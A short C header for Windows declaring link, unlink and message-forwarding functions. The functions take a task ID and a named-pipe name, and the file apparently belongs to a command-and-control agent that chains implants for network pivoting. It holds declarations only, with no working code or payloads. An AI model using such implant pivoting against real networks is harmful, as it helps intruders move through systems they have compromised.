#pragma once
#ifndef LINK_H
#define LINK_H

#include <windows.h>
#include "Parser.h"
#include "Config.h"

#ifdef INCLUDE_CMD_LINK
VOID Link( PCHAR taskUuid, PPARSER arguments );
BOOL LinkAdd( PCHAR PipeName, PVOID* outBuf, SIZE_T* outLen );
// BOOL LinkForward( PPARSER delegates );
BOOL LinkForward( PVOID Msg, SIZE_T Length );
UINT32 PivotParseLinkId( PVOID buffer, SIZE_T size );
#endif

#ifdef INCLUDE_CMD_UNLINK
VOID UnLink(PCHAR taskUuid, PPARSER arguments);
#endif

#endif //LINK_H